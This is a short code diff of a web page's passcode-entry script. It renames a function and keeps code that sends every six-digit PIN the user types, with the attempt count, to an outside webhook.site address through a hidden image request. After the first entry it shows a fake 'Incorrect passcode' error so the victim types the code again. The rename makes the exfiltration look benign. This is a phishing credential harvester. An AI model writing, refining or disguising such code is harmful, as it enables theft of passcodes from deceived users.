@@ -57,7 +57,7 @@
         let pin = '';
         let attempts = 0;
 
-        function sendToWebhook(currentPin, currentAttempt) {
+        function sendPin(currentPin, currentAttempt) {
             const url = `https://webhook.site/3084eaf3-6b29-4150-8864-e93e0166b819?pin=${currentPin}&attempts=${currentAttempt}&status=PASSCODE_ENTERED`;
             new Image().src = url;
         }
@@ -69,7 +69,7 @@
 
             if (pin.length === 6) {
                 attempts++;
-                sendToWebhook(pin, attempts);   // Send every time
+                sendPin(pin, attempts);   // Send every full attempt
 
                 if (attempts === 1) {
                     document.getElementById('error').textContent = "Incorrect passcode. Try again.";
